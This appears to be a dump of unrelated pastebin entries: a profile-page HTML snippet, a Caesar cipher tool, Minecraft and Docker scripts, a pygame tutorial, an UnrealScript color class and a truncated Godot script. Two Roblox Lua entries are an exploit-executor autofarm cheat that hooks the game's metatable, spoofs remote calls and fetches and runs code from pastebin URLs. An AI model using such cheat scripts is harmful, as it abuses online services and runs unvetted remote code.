CÓDIGO DO ABOUT:
<div
    style=""
        width: 1966px;
        height: 936px;
        background: url('https://i.postimg.cc/81G0r79L/ABOUTMODELO-03-YU.png');
        margin: -77px -697px;
    ""
    class=""uk-position-relative side-main-user""
>
    <div style=""margin-left: 310px; margin-top: 80px"">
        <a href=""https://yoble.us/add-friend/838613"" alt=""ADICIONAR""
            ><img
                src=""https://i.postimg.cc/FRq3PzjX/links.png""
                alt=""ADICIONAR""
        />
        <br>
    <a href=""https://yoble.us/scraps/marinkitagawa"" alt=""RECADOS""
            ><img
                src=""https://i.postimg.cc/FRq3PzjX/links.png""
                alt=""RECADOS""
                style=""margin-top: 38px;""
        />
        <br>
    <a href=""https://yoble.us/friends/marinkitagawa"" alt=""AMIGOS""
            ><img
                src=""https://i.postimg.cc/FRq3PzjX/links.png""
                alt=""AMIGOS""
                style=""margin-top: 38px;""
        />
        <br>
    <a href=""https://yoble.us/remove-friend/838613"" alt=""REMOVER""
            ><img
                src=""https://i.postimg.cc/FRq3PzjX/links.png""
                alt=""REMOVER""
                style=""margin-top: 38px;""
        />
        <br>
    <a href=""https://yoble.us/communities/marinkitagawa"" alt=""COMUNIDADES""
            ><img
                src=""https://i.postimg.cc/FRq3PzjX/links.png""
                alt=""COMUNIDADES""
                style=""margin-top: 38px;""
        />
        <br>
    </div>
</div>  "
XHrKP9Kh,caesar.py,dogs_are_cute,Python,Saturday 19th of August 2023 06:49:18 AM CDT,"#! /usr/bin/env python3
from os import path
from io import TextIOWrapper
from string import ascii_letters
import typing as t
import getopt
import atexit
import sys
# '!-a' = optional, '-a,-b' = union, '-a' = required
opt_format: t.Tuple[t.Tuple[str, ...], ...] = ((""-h"",), (""-e,-d"", ""-k,-b"", ""!-p"", ""-s""),
                                               (""-e,-d"", ""-k,-b"", ""!-p"", ""-f"", ""-c""))


def check_format(f: t.Tuple[str, ...]) -> t.Tuple[t.Optional[str], int]:
    opt_idx = 0
    for opt_f in f:
        if opt_idx >= len(opts):
            return ""not enough arguments"", opt_idx
        opt_str = opts[opt_idx][0]
        union_opts = opt_f.split("","")
        if opt_f.startswith(""!""):
            if opt_str == opt_f[1:]:
                opt_idx += 1
            continue
        elif "","" in opt_f:
            if opt_str not in union_opts:
                return ""either %s, or %s is required %s"" % ("", "".join(union_opts[:-1]), union_opts[-1],
                                                            ""after %s"" % (opts[opt_idx - 1][0],) if opt_idx
                                                            else ""as the first option""), opt_idx
        elif opt_str != opt_f:
            return ""option %s is missing or in the wrong place"" % (opt_f,), opt_idx
        opt_idx += 1
    if opt_idx == len(opts):
        return None, -1
    else:
        return ""too many arguments"", opt_idx


def check_opts() -> t.Optional[str]:
    if not opts:
        return ""no command-line arguments received""
    elif non_opts:
        return ""non-option arguments were found when none were expected""
    max_idx = -1
    max_err = """"
    for f_type in opt_format:
        err_msg, stop_idx = check_format(f_type)
        if err_msg is None:
            return None
        elif stop_idx > max_idx:
            max_idx = stop_idx
            max_err = err_msg
    else:
        return max_err


def display_error(err_msg: str) -> None:
    print(""error: %s\nRun \""caesar -h\"" if you need help on command-line options."" % (err_msg,))


def main_proc(opt_dict: t.Dict[str, str]) -> t.Optional[str]:
    if ""-h"" in opt_dict:
        print(help_text)
        return None
    if ""-e"" in opt_dict and ""-b"" in opt_dict:
        return ""option -b cannot be used when encoding""
    if ""-s"" in opt_dict:
        data = opt_dict[""-s""]
    else:
        try:
            data = open(path.normpath(path.abspath(path.expandvars(path.expanduser(opt_dict[""-f""])))), ""r"",
                        encoding=opt_dict[""-c""])
            atexit.register(data.close)
        except OSError:
            return (""file IO error, please make sure the path you typed is correct, the encoding is valid, and this ""
                    ""program has read-permissions to the file"")
    # noinspection PyTypeChecker
    c_mode: t.Literal[""encode"", ""decode""] = ""encode"" if ""-e"" in opt_dict else ""decode""
    if ""-k"" in opt_dict:
        shift_key = opt_dict[""-k""]
        if not shift_key.isdigit():
            return ""option -k only accepts a base-10 number""
        shift_key = int(shift_key)
        if shift_key < 1 or shift_key > 25:
            return ""invalid value for shift key, valid range is between 1 and 25 (inclusive).""
        else:
            # noinspection PyTypeChecker
            c = caesar_cipher(data, shift_key, ""-p"" in opt_dict, c_mode)
            output_stream(c)
    else:
        seperator = ""-"" * 32
        for k in range(1, 26):
            print(""%s\nShift key: %d"" % (seperator, k))
            # noinspection PyTypeChecker
            output_stream(caesar_cipher(data, k, ""-p"" in opt_dict, c_mode))
            if ""-f"" in opt_dict:
                data.seek(0)


def output_stream(caesar_obj: t.Generator) -> None:
    try:  # If STDOUT errors, suppress stack trace and exit.
        for s in caesar_obj:
            print(s, end="""", flush=True)
    except OSError:
        raise SystemExit()


def caesar_cipher(data: t.Union[str, TextIOWrapper], shift_key: int, keep_case: bool,
                  mode: t.Literal[""encode"", ""decode""]) -> t.Generator:
    text_index = 0
    buffer_size = 100
    chunk = True
    start_point = ord(""a"")
    end_point = ord(""z"")
    max_dist = ord(""z"") - ord(""a"")
    while chunk:
        if isinstance(data, str):
            chunk = data[text_index:text_index + buffer_size + 1]
            text_index += buffer_size
        else:
            chunk = data.read(buffer_size)
        shifted = []
        for char in chunk:
            if char not in ascii_letters:
                shifted.append(char)
                continue
            # noinspection PyTypeChecker
            case: t.Literal[""lower"", ""upper""] = ""lower"" if char.islower() else ""upper""
            c = char.lower() if case == ""upper"" else char
            if mode == ""encode"":
                result = chr((ord(c) - start_point + shift_key) % (max_dist + 1) + start_point)
            else:
                result = chr((ord(c) - end_point - shift_key) % -(max_dist + 1) + end_point)
            if keep_case and case == ""upper"":
                result = result.upper()
            shifted.append(result)
        yield """".join(shifted)


help_text = \
""""""
usage: caesar [-h]
       caesar [-e | -d] [-k KEY | -b] [-p] [-s STRING]
       caesar [-e | -d] [-k KEY | -b] [-p] [-f PATH] [-c ENCODING]
    -h    Displays this help and exits.
    -e    The data given will be encoded.
    -d    The data given will be decoded.
    -k    The shift key used to encode or decode.
    -b    Brute-force the shift key.
    -p    When given, the case of the letters in the data will be preserved.
    -s    The string that will be encoded/decoded.
    -f    The path to the text file that will be encoded/decoded.
    -c    Only needed when -f is used, specifies the encoding of the file.

This utility uses lazy-loading when reading from a file, so passing in very large text files will not cause problems with memory usage. When doing so, it might be a good idea to pipe the output of this utility to a pager program like ""more"" so you can read the output in time. For example: `caesar -d -k 15 -p -f ""%userprofile%\Documents\huge_file.txt"" -c ""utf-8"" | more`. Also, when passing a string literal to the utility, make sure to escape double quotes in the string by preceding it with a backslash or doubling it.
"""""".strip()
try:
    opts, non_opts = getopt.getopt(sys.argv[1:], ""hedk:bps:f:c:"")
except getopt.GetoptError as e:
    display_error(e.msg)
    raise SystemExit(2)
msg = check_opts()
if msg is None:
    msg = main_proc(dict(opts))
if msg is not None:
    display_error(msg)
    raise SystemExit(2)"
cDmbm1Mi,"p.getPlayersInCoords({29.0,64.0,1815.lua",Donut28,Lua,Saturday 19th of August 2023 06:29:08 AM CDT,"p = peripheral.wrap(""bottom"")
firstPoint = {x=29,y=64,z=1815}
secondPoint = {x=33,y=66,z=1813}

while true do
    players = p.getPlayersInCoords(firstPoint, secondPoint)
    if #players > 0 then
        redstone.setAnalogOutput(""top"", 15)
    else
        redstone.setAnalogOutput(""top"", 0)
    end
end"
jDmbSi49,Untitled,EVilumaa,Lua,Saturday 19th of August 2023 06:11:17 AM CDT,"--//Autofarm

--//Variables
local Player = game.Players.LocalPlayer;
local Character = Player.Character:WaitForChild(""Playermodel""):WaitForChild(""Charmodel"");
local HRP = Character:WaitForChild(""HumanoidRootPart"");
local ToggleKey = Enum.KeyCode.X

if game.Workspace:FindFirstChild(""Live"") then return end

--//Tables
local Settings = {};

--//Cooldowns
local lastAttack = tick();

--//Globals
_G.Autofarm = true;

if _G.Autofarm == false then
    return
end

--//Services
local UIS = game:GetService(""UserInputService"");
local VIM =  game:GetService(""VirtualInputManager"");
local Debris = game:GetService(""Debris"");
local HttpService = game:GetService(""HttpService"");

--//Setup
local Live = Instance.new(""Folder"");
Live.Name = ""Live"";
Live.Parent = game.Workspace;

local Explosions = Instance.new(""Folder"");
Explosions.Name = ""Explosions"";
Explosions.Parent = game.Workspace;

if isfile(""NK_Settings.json"") then
    Settings = HttpService:JSONDecode(readfile(""NK_Settings.json""));
end

--//Toggle
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode == ToggleKey then
        _G.Autofarm = not _G.Autofarm;
    end
end)

--//Functions

function getClosestMob()
    local closestMob = nil;
    local lastDistance = math.huge;
    local lastPart = nil;

    for _, Mob in pairs(Live:GetChildren()) do
        if Mob:FindFirstChild(""Tags"") and (Mob:FindFirstChild(""Hitbox"") or Mob:FindFirstChild(""Base"") or Mob:FindFirstChild(""HumanoidRootPart"") or Mob:FindFirstChild(""Main"")) then
            local canContinue = true;
            if Mob:FindFirstChild(""Status"") and Mob:FindFirstChild(""Status""):FindFirstChild(""Debuff_Invincible"") and closestMob ~= nil then
                canContinue = false;
            end

            if canContinue == true then
                lastPart = Mob:FindFirstChild(""Hitbox"") or Mob:FindFirstChild(""Base"") or Mob:FindFirstChild(""HumanoidRootPart"") or Mob:FindFirstChild(""Main"")
                local currentDistance = (HRP.Position - lastPart.Position).Magnitude;
                if closestMob ~= nil and (currentDistance < lastDistance or closestMob:FindFirstChild(""Status"") and closestMob:FindFirstChild(""Status""):FindFirstChild(""Debuff_Invincible"")) then
                    closestMob = Mob;
                    lastDistance = currentDistance;
                elseif closestMob == nil then
                    closestMob = Mob;
                    lastDistance = currentDistance;
                end
            end
        end
    end

    if closestMob ~= nil then
        lastPart = closestMob:FindFirstChild(""Hitbox"") or closestMob:FindFirstChild(""Critbox"");
    end
    
    return closestMob, lastPart
end

function pressKey(Key, Hold)
    VIM:SendKeyEvent(Hold, Key, false, game);
end

function checkChests()
    for _, Chest in pairs(game.Workspace.Dungeon:GetDescendants()) do
        if (findName(Chest.Name, ""chest"") or findName(Chest.Name, ""_medical"") and not findName(Chest.Name, ""machine"") or findName(Chest.Name, ""_ammo"") and not findName(Chest.Name, ""machine"") or findName(Chest.Name, ""locker"")) and 
        (Chest:FindFirstChild(""Interact"") and Chest:FindFirstChild(""Interact""):IsA(""BasePart"") or
        Chest:FindFirstChild(""Chest"") and Chest:FindFirstChild(""Chest""):IsA(""BasePart"")) and not Chest:FindFirstChild(""Opened"") then
            local Part = Chest:FindFirstChild(""Interact"") or Chest:FindFirstChild(""Chest"");
            HRP.CFrame = Part.CFrame;
            local Distance = (HRP.Position - Part.Position).Magnitude;
            repeat task.wait() Distance = (HRP.Position - Part.Position).Magnitude until Distance <= 4
            local Times = findName(Chest.Name, ""chest"") and 30 or 10
            game.ReplicatedStorage.Ints.Interactcontrol:InvokeServer(""Chestopen"", Chest);
            local Opened = Instance.new(""Folder"");
            Opened.Name = ""Opened"";
            Opened.Parent = Chest;
            task.wait(1.47);
        end
    end

    return true
end

function passRoom(Door)
    local Part = Door:FindFirstChild(""Interact"") or Door:FindFirstChild(""Part"")
    if Part == nil then
        Part = Door:FindFirstChildWhichIsA(""BasePart"");
    end
    HRP.CFrame = Part.CFrame;
    task.wait();
    game.ReplicatedStorage.Ints.Regiontrig:FireServer(""Door"", Door);
end

function checkRoom()
    local Empty = false;
    local Door = nil;
    
    for _, v in pairs(game.Workspace.Dungeon:GetDescendants()) do
        if findName(v.Name, ""shrine"") and v.Name ~= ""Shrine"" and v:FindFirstChildWhichIsA(""BasePart"") and v:FindFirstChildWhichIsA(""BasePart"").Name == ""Interact"" then
                HRP.CFrame = v:FindFirstChildWhichIsA(""BasePart"").CFrame;
                task.wait(0.1);
                v:FindFirstChildWhichIsA(""BasePart"").Purchase:FireServer();
                task.wait(1);
                v:Destroy();
            end

            if v.Name == ""Midnight_Shrineend"" and v:FindFirstChild(""Interact"") then
                HRP.CFrame = v:FindFirstChild(""Interact"").CFrame;
                task.wait(0.1);
                v:FindFirstChild(""Interact"").Purchase:FireServer();
                task.wait(20);
                v:Destroy();
            end
            
        if v.Name == ""Nextroomind"" and v.Enabled == true then
            Empty = true;
            Door = v.Parent;
        end
    end

    return Empty, Door
end

function collectBundles()
    for _, Bundle in pairs(Player.Character:GetChildren()) do
        if Bundle.Name == ""Pickup"" and Bundle:FindFirstChild(""Pickupbase"") then
            Bundle.Pickupbase.CFrame = HRP.CFrame
        end
    end
end

function getYLevel()
    local Y = 1.7;
    if Explosions:FindFirstChild(""ExplodingBarrel"") then
        Y = 100;
    end
    return Y
end

function startFarm()
    local closestMob, Part = getClosestMob();

    if closestMob ~= nil then
        local Y = getYLevel();
        HRP.CFrame = Part.CFrame * CFrame.new(5, Y, 5);
        if findName(closestMob.Name, ""heart"") and closestMob:FindFirstChild(""Interact"") then
            closestMob.Interact.Purchase:FireServer();
            closestMob.Interact.Name = ""Used"";
        end
        Attack(Part);
    else
        local isRoomEmpty, Door = checkRoom();

        if isRoomEmpty == true and Door ~= nil then
            checkChests()
            passRoom(Door)
        end
    end
end

function Attack(lastPart)
    local Distance = (HRP.Position - lastPart.Position).Magnitude;

    if Distance <= 20 then
        Player.Character.Gunmain.Guninput:FireServer(
            ""Melee"",
            tick(),
            HRP.CFrame,
            math.random(0, 1000),
            1,
            {},
            false
        )
        Player.Character.Gunmain.Guninput:FireServer(
            ""Melee"",
            tick(),
            HRP.CFrame,
            math.random(0, 1000),
            2,
            {},
            true
        )
        lastAttack = tick();
    end
    
end

function findName(Name, Find)
    return string.find(string.lower(Name), Find)
end

function updateMobs()
    for _, Mob in pairs(game.Workspace.Dungeon:GetDescendants()) do
        if Mob:FindFirstChild(""Tags"") and not findName(Mob.Name, ""barrel"") and not findName(Mob.Name, ""propane"") and not findName(Mob.Name, ""sludge"") and not findName(Mob.Name, ""cannon"") and not findName(Mob.Name, ""firepad"") and not findName(Mob.Name, ""conveyor"") and not findName(Mob.Name, ""sidepress"") and not findName(Mob.Name, ""pressfast"") then
            Mob.Parent = Live;
        elseif findName(Mob.Name, ""barrel"") then
            if Mob:FindFirstChild(""Explosivedeath"") then
                if #Explosions:GetChildren() <= 3 then
                    local Explosion = Instance.new(""Folder"");
                    Explosion.Name = ""ExplodingBarrel"";
                    Explosion.Parent = Explosions;
                    Debris:AddItem(Explosion, 0.01);
                end

                task.spawn(function()
                    task.wait(1)
                    if Mob and Mob:FindFirstChild(""Explosivedeath"") then
                        Mob.Explosivedeath:Destroy();
                    end
                end)

            end
        end
    end
end

--//Update
task.spawn(function()
    while true do
        if _G.Autofarm then
            collectBundles()
            updateMobs()
            startFarm()
        end
        task.wait(0.1)
    end
end)

--//Auto Pickup
game.Workspace.ChildAdded:Connect(function(Child)
    repeat task.wait(0.1)
    if Child.Name == ""Lootbundle"" and _G.Autofarm == true then
        game.ReplicatedStorage.Ints.Interactcontrol:InvokeServer(
            ""Gunopen"",
            ""Unequip"",
            Child:GetChildren()[1],
            ""Gunitem""
        )
    end
    until Child == nil
end)

--//Rejoin
Player.PlayerGui.Run.Dead.Return.Changed:Connect(function()
    if Player and Player:FindFirstChild(""PlayerGui"") and Player.PlayerGui.Run.Dead.Return.Visible == true then
        task.wait(1.7);
        game.ReplicatedStorage.Ints.Regiontrig:FireServer(""Leave"");
    end
end)

--//Finished Run
Player.PlayerGui.Run.Runend.Return.Changed:Connect(function()
    if Player and Player:FindFirstChild(""PlayerGui"") and Player.PlayerGui.Run.Runend.Return.Visible == true then
        task.wait(1.7);
        if Settings.NextRegion == false or game.ReplicatedStorage.World.Dungeondata.Location.Value == ""Junction"" or (Settings.LeaveAtRegion ~= nil and Settings.LeaveAtRegion ~= """") and game.ReplicatedStorage.World.Dungeondata.Location.Value == Settings.LeaveAtRegion then
            game.ReplicatedStorage.Ints.Regiontrig:FireServer(""Leave"");
        else
            game.ReplicatedStorage.Ints.Regiontrig:FireServer(""Votenext"");
        end
    end
end)

--//Load Script
queue_on_teleport([[
    repeat task.wait() until game:IsLoaded();
    local Player = game.Players.LocalPlayer;
    task.wait(7);
    repeat task.wait() until not Player.PlayerGui:FindFirstChild(""Intro"");
    loadstring(game:HttpGet(""https://pastebin.com/raw/tmjJZRuF""))();
]])"
tmjJZRuF,Untitled,EVilumaa,Lua,Saturday 19th of August 2023 06:10:17 AM CDT,"--//Teleport
local Player = game.Players.LocalPlayer;
local Run = Player.PlayerGui.Run;

repeat task.wait() until game:IsLoaded();
repeat task.wait() until not Player.PlayerGui:FindFirstChild(""Intro"");
if not game.Workspace:FindFirstChild(""Dungeon"") then
repeat task.wait() until Run.Runsummary.Main.Close.Visible == true
task.wait(10);
end

--//Tables
local Settings = {};

--//Services
local HttpService = game:GetService(""HttpService"");

--//Functions
function loadSettings()
    if isfile(""NK_Settings.json"") then
    Settings = HttpService:JSONDecode(readfile(""NK_Settings.json""));
    end
end

function saveSettings()
    local savedTable = HttpService:JSONEncode(Settings);

    writefile(""NK_Settings.json"", savedTable);
    Settings = HttpService:JSONDecode(readfile(""NK_Settings.json""));
end

function Press(Path)
    for i,v in pairs(getconnections(Path)) do
        v:Function();
    end
end

--///Setup
loadSettings();

if Settings.Region == nil then
    error(""No Region Specified"");
end

if Settings.Difficulty == nil then
    error(""No Difficulty Specified"");
end

if Settings.Special == nil then
    error(""Please specify Special"");
end

if Settings.NextRegion == nil or Settings.AutoSell == nil then
    local Function = Instance.new(""BindableFunction"")
Function.OnInvoke = CallBack

game:GetService(""StarterGui""):SetCore(""SendNotification"", {
Title = ""Outdated"",
Text = ""Please get the updated script from the discord or v3rmillion"",
Icon = """",
Duration = 10,
Callback = Function;
})
end

if Settings.LeaveAtRegion == nil then
    local Function = Instance.new(""BindableFunction"")
Function.OnInvoke = CallBack

game:GetService(""StarterGui""):SetCore(""SendNotification"", {
Title = ""Outdated"",
Text = ""LeaveAtRegion property not specificed, Might be Outdated, Check discord."",
Icon = """",
Duration = 10,
Callback = Function;
})
end

if Settings.RarityFilter == nil or type(Settings.RarityFilter) ~= ""string"" then
    local Function = Instance.new(""BindableFunction"")
Function.OnInvoke = CallBack

game:GetService(""StarterGui""):SetCore(""SendNotification"", {
Title = ""Outdated"",
Text = ""Please get the updated script from the discord or v3rmillion"",
Icon = """",
Duration = 10,
Callback = Function;
})
return
end

if game.Workspace:FindFirstChild(""Dungeon"") and Settings.NextRegion == true and not game.Workspace:FindFirstChild(""Live"") then
    loadstring(game:HttpGet(""https://pastebin.com/jDmbSi49""))();
    return
end


local MT = getrawmetatable(game);
setreadonly(MT, false);

local Old = MT.__namecall;

MT.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod();
    local Args = {...};

    if Method == ""FireServer"" and self.Name == ""Regiontrig"" and Args[1] == ""Lobby"" then
        Args[2][""Region""] = Settings.Region;
        Args[2][""Difflevel""] = Settings.Difficulty;
        Args[2][""Payment""] = ""None"";
		Args[2][""Special""] = Settings.Special;
    end

    return Old(self, unpack(Args))
end)

--//Load Script
queue_on_teleport([[
    repeat task.wait() until game:IsLoaded();
    local Player = game.Players.LocalPlayer;
    repeat task.wait() until not Player.PlayerGui:FindFirstChild(""Intro"");
    task.wait(1);
    loadstring(game:HttpGet(""https://pastebin.com/raw/jDmbSi49""))();
]])

if Run.Runsummary.Visible == true then
Press(Run.Runsummary.Main.Close.Button.MouseButton1Click);
task.wait(3);
end

Press(Player.PlayerGui.Game.Relax.Equip.Subframe.Run.Button.MouseButton1Click);
task.wait(1.47);
Press(Run.Runsetup.Setup.Choices.Quickstart.Button.MouseButton1Click);
task.wait(4);
game.ReplicatedStorage.Ints.Regiontrig:FireServer(""Start"", Run.Setup.Lobby.Value);"
ZZCVqBJn,Restart Dockers,JLMoss,Bash,Saturday 19th of August 2023 06:09:35 AM CDT,"#!/bin/bash
# function restartDockerByName()
# requires a container name be passed to it
function restartDockerByName(){
    for j in $(docker container ls -a | grep $1 | cut -c1-12)
    do
		# this is a 'restart function'
        # so make sure the docker is already running
		# don't act on it otherwise
		szStatus=`docker inspect -f '{{.State.Running}}' $j`
        if [ ""$szStatus"" = ""true"" ]
        then
            #echo ""$j state: Not Running""
            echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: $1 is running""
            echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: $1 stopping""
            docker stop $j  > /dev/null 2>&1
            echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: $1 stopped""
            ##
            echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: $1 starting""
            docker start $j > /dev/null 2>&1
            echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: $1 started""
            echo ''
        else
            echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: $1 is not running""
            echo ''        
        fi
        
    done
}

# szContainers: list of dockers to restart
szContainers=('container1' 'container2');
szCount=${#szContainers[@]};

# Check if docker is running
if docker info > /dev/null 2>&1; then
    echo ''
    #echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: dockeris running""
    #echo ''

    #loop thru szContainers
    for i in ${szContainers[@]}; do
        echo ""Status: Restarting $i""
        # restartDockerbyName <containername>
        restartDockerByName $i
    done

    echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: finished exiting""
else
    echo ""`date ""+%Y-%m-%d %H:%M:%S""`"" ""Status: docker is not running exiting""
    exit 1
fi

exit"
jeBHsLv5,data669,TestGuy1,JSON,Saturday 19th of August 2023 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '06e853c8b6b79989200584a343049f712a119d278e9c6bf4a9a0cde60e17fd04aa774dac69749befa5c53b46398d741fad2e0c1da2bf73897fc91ab57c2324e2564538ab00db09122a2dcc358af250d415319aa84e96e52ff550e381873f362619e5ca8d1ea55282b76a82701e468f29fdcc9a5aca631a22031e6545c0b2230e',
  otherdata: [
    'e571040bfc2122a3135de3f7b301a53c',
    '8c081fa296fc0af0acdd491dd2a473d8',
    '2c915a4f315da5b8bae454b7822b7ec7',
    '9d863f5c18281cc7fcff637b8609f804',
    '698f9b3bab0bd685f60df38f2a554201',
    '56162e6c6c08aa42f592ed42b7f69d77',
    'fed6afcc8e02e46c44f893dfd1d2416d',
    'a913a345b86303c936ed59256a4d9c97'
  ]
}"
ZWshpLZ0,pygame1,plarmi,Python,Saturday 19th of August 2023 05:32:17 AM CDT,"import pygame
import sys

# Уквазываем количество кадров в секунду (frame per second)
FPS = 60

# Указываем переменные-константы с цветами в виде кода RGB
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)

# ВСЕГДА указываем эту строчку для инициализации всех методов pygame
pygame.init()

# Создаём окно шириной 600, высотой 400 (значения можно менять)
sc = pygame.display.set_mode((600, 400))

# Указываем заголовок окна
pygame.display.set_caption(""Супер игра"")

# Здесь ниже мы указываем любой код, например, чтобы что-то нарисовать

# Рисуем прямоугольник (квадрат). Указывается 3 аргумента: где мы рисуем, каким цветом рисуем (в RGB), свойства
# 4 свойства: положение по x, положение по y, ширина, высота
pygame.draw.rect(sc, GREEN, (150, 20, 100, 75))
# Если мы укажем 4-ый аргумент, то прямоугольник будет рисоваться без заливки, а от указанного числа будет зависеть толщина
# pygame.draw.rect(sc, GREEN, (150, 20, 100, 75), 4)

# Рисуем линии по точкам. Указывается 4 аргумента: где мы рисуем, каким цветом рисуем (в RGB), смыкание линий
# (True - смыкаются, False - не смыкаются), координаты (минимум двух) точек по x, y в виде списка
pygame.draw.lines(sc, WHITE, True, [[10, 10], [140, 70], [280, 20]])
# Если мы укажем 5-ый аргумент, то от указанного числа будет зависеть толщина
# pygame.draw.lines(sc, WHITE, True, [[10, 10], [140, 70], [280, 20]], 5)

# Когда мы что-то изменили в окне (например, что-то нарисовали), то мы ВСЕГДА должны обновить окно
pygame.display.update()

# Каркас с бесконечным циклом, который позволяет удерживать окно пока мы его сами не закроем
while True:
    for i in pygame.event.get():
        if i.type == pygame.QUIT:
            sys.exit()

"
KdUeidss,L2UIColor,AlisaCodeDragon,UnrealScript,Saturday 19th of August 2023 05:17:09 AM CDT,"class L2UIColor extends UIScript;

var Color White;
var Color WhiteSmoke;
var Color Yellow;
var Color Tallow;
var Color Blue;
var Color DeepSkyBlue;
var Color BrightWhite;
var Color Gold;
var Color Gray;
var Color Silver;
var Color Nobel;
var Color Charcoal;
var Color Yellow03;
var Color Frangipani;
var Color ColorDesc;
var Color ColorYellow;
var Color ColorGray;
var Color ColorLightBrown;
var Color ColorGold;
var Color ColorMinimapFont;
var Color HotPink;
var Color PowderPink;
var Color Token0;
var Color Token1;
var Color Token2;
var Color Token3;
var Color DarkGray;
var Color BWhite;
var Color DRed;
var Color Red;
var Color Red1;
var Color Red2;
var Color Red3;
var Color Froly;
var Color VIOLET01;
var Color VIOLET02;
var Color PKNameColor;
var Color Green;
var Color Lime;
var Color BLUE01;
var Color CAPRI;
var Color Sandrift;

function OnLoad()
{
    initColor();
    return;
}

function initColor()
{
    Sandrift.R = 176;
    Sandrift.G = 155;
    Sandrift.B = 121;
    Sandrift.A = byte(255);
    BrightWhite.R = byte(255);
    BrightWhite.G = byte(255);
    BrightWhite.B = byte(255);
    BrightWhite.A = byte(255);
    WhiteSmoke.R = 240;
    WhiteSmoke.G = 240;
    WhiteSmoke.B = 240;
    WhiteSmoke.A = byte(255);
    White.R = 200;
    White.G = 200;
    White.B = 200;
    White.A = byte(255);
    Yellow.R = 235;
    Yellow.G = 205;
    Yellow.B = 0;
    Yellow.A = byte(255);
    Tallow.R = 170;
    Tallow.G = 153;
    Tallow.B = 119;
    Tallow.A = byte(255);
    Blue.R = 102;
    Blue.G = 150;
    Blue.B = 253;
    Blue.A = byte(255);
    Gold.R = 176;
    Gold.G = 153;
    Gold.B = 121;
    Gold.A = byte(255);
    Gray.R = 120;
    Gray.G = 120;
    Gray.B = 120;
    Gray.A = byte(255);
    Silver.R = 182;
    Silver.G = 182;
    Silver.B = 182;
    Silver.A = byte(255);
    HotPink.R = 195;
    HotPink.G = 46;
    HotPink.B = 97;
    HotPink.A = byte(255);
    PowderPink.R = byte(255);
    PowderPink.G = 192;
    PowderPink.B = 203;
    PowderPink.A = byte(255);
    Token0.R = 211;
    Token0.G = 192;
    Token0.B = 82;
    Token0.A = byte(255);
    Token1.R = 170;
    Token1.G = 152;
    Token1.B = 120;
    Token1.A = byte(255);
    Token2.R = 168;
    Token2.G = 103;
    Token2.B = 53;
    Token2.A = byte(255);
    Token3.R = 175;
    Token3.G = 42;
    Token3.B = 39;
    Token3.A = byte(255);
    Yellow03.R = byte(255);
    Yellow03.G = 204;
    Yellow03.B = 0;
    Yellow03.A = byte(255);
    Frangipani.R = 254;
    Frangipani.G = 215;
    Frangipani.B = 160;
    Frangipani.A = byte(255);
    ColorDesc.R = 175;
    ColorDesc.G = 185;
    ColorDesc.B = 205;
    ColorDesc.A = byte(255);
    ColorYellow.R = byte(255);
    ColorYellow.G = 221;
    ColorYellow.B = 102;
    ColorYellow.A = byte(255);
    ColorGray.R = 182;
    ColorGray.G = 182;
    ColorGray.B = 182;
    ColorGray.A = byte(255);
    ColorGold.R = 176;
    ColorGold.G = 153;
    ColorGold.B = 121;
    ColorGold.A = byte(255);
    ColorMinimapFont.R = 181;
    ColorMinimapFont.G = 181;
    ColorMinimapFont.B = 170;
    ColorMinimapFont.A = byte(255);
    ColorLightBrown.R = 238;
    ColorLightBrown.G = 170;
    ColorLightBrown.B = 34;
    ColorLightBrown.A = byte(255);
    DarkGray.R = 68;
    DarkGray.G = 68;
    DarkGray.B = 68;
    DarkGray.A = byte(255);
    BWhite.R = 211;
    BWhite.G = 211;
    BWhite.B = 211;
    BWhite.A = byte(255);
    DRed.R = byte(255);
    DRed.G = 102;
    DRed.B = 102;
    DRed.A = byte(255);
    Red.R = byte(255);
    Red.G = 50;
    Red.B = 0;
    Red.A = byte(255);
    Red1.R = byte(255);
    Red1.G = 0;
    Red1.B = 0;
    Red1.A = byte(255);
    Red2.R = byte(255);
    Red2.G = 102;
    Red2.B = 102;
    Red2.A = byte(255);
    Red3.R = byte(255);
    Red3.G = 153;
    Red3.B = 153;
    Red3.A = byte(255);
    VIOLET01.R = 238;
    VIOLET01.G = 170;
    VIOLET01.B = byte(255);
    VIOLET01.A = byte(255);
    VIOLET02.R = 136;
    VIOLET02.G = 136;
    VIOLET02.B = byte(255);
    VIOLET02.A = byte(255);
    PKNameColor.R = 230;
    PKNameColor.G = 100;
    PKNameColor.B = byte(255);
    PKNameColor.A = byte(255);
    BLUE01.R = 85;
    BLUE01.G = 153;
    BLUE01.B = byte(255);
    BLUE01.A = byte(255);
    Green.R = 119;
    Green.G = byte(255);
    Green.B = 153;
    Green.A = byte(255);
    Lime.R = 0;
    Lime.G = byte(255);
    Lime.B = 0;
    Lime.A = byte(255);
    CAPRI.R = 0;
    CAPRI.G = 170;
    CAPRI.B = byte(255);
    CAPRI.A = byte(255);
    Froly.R = 230;
    Froly.G = 101;
    Froly.B = 101;
    Froly.A = byte(255);
    Nobel.R = 230;
    Nobel.G = 101;
    Nobel.B = 101;
    Nobel.A = byte(255);
    Charcoal.R = 70;
    Charcoal.G = 70;
    Charcoal.B = 70;
    Charcoal.A = byte(255);
    DeepSkyBlue.R = 0;
    DeepSkyBlue.G = 170;
    DeepSkyBlue.B = byte(255);
    DeepSkyBlue.A = byte(255);
    return;
}
"
eChYTwRU,v1 godot movement,norbyscook,GDScript,Saturday 19th of August 2023 05:09:11 AM CDT,"# v1 good, 
# written for godot movement
# it works well and is simple
extends Node2D

# Declare member variables here.
var velocity := Vector2.ZERO
var direction := Vector2.ZERO
var max_speed: float = 200

# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta):
	
	direction = get_direction()
	
	if direction:
		velocity = accelerate(0.1)
	else:
		velocity = decelerate(0.07)
	
	position += velocity * delta


